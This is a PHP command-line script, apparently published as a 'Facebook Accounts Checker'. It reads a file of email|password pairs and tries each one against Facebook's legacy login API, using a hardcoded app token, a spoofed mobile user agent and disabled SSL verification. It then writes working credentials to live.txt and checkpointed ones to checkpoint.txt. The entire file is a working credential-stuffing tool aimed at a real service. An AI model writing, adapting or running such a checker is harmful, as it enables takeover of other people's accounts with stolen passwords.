<?php
/**
 * @author Rifqi Haidar
 * @license MIT License
 * @link https://github.com/rifqihaidar/Facebook-Accounts-Checker
 */

if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($ambil as $targets) {
            $potong = explode("|", $targets);
            cekAkunFb($potong[0], $potong[1]);
        }
    }else die("File doesn't exist!");
}else die("Usage: php check.php targets.txt");

function cekAkunFb($email, $passwd) {
    $data = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $passwd,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($data as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $data['sig'] = $sig;

    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $result = json_decode(curl_exec($ch));

    $empas = $email."|".$passwd;
    if(isset($result->access_token)) {
        echo $empas." --> LIVE".PHP_EOL;
        file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
    }elseif($result->error_code == 405 || preg_match("/User must verify their account/i", $result->error_msg)) {
        echo $empas." --> CHECKPOINT".PHP_EOL;
        file_put_contents("checkpoint.txt", $empas.PHP_EOL, FILE_APPEND);
    }else echo $empas." --> DEAD".PHP_EOL;
}
